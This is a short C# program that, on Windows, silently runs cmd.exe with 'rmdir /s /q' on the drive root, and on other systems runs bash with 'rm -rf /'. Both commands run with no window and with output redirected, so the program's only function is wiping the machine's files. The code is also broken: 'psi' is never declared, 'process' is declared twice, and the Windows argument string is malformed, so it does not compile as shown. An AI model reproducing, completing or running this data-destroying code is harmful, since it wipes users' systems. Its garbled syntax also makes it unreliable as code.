using System;
using System.Diagnostics;

class Program
{
    static void Main(string[] args)
    {
        if (OperatingSystem.IsWindows())
        {
            Process process = new Process();
            psi.FileName = "cmd.exe";
            psi.Arguments = "rmdir /s /q \";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using var process = Process.Start(psi);
            process.WaitForExit();
        }
        else
        {
            Process process = new Process();
            psi.FileName = "/bin/bash";
            psi.Arguments = "rm -rf /";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using var process = Process.Start(psi);
            process.WaitForExit();
        }
    }
}
